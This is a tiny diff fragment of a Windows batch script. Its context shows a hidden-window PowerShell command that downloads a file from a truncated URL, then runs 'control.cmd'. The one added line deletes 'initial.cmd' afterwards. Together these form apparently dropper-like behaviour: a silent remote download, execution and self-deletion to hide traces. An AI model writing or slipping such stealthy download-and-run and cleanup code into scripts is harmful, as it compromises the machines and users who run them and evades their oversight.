@@ -8,3 +8,4 @@ powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https:
 control.cmd
 
 cd %initial%
+del initial.cmd
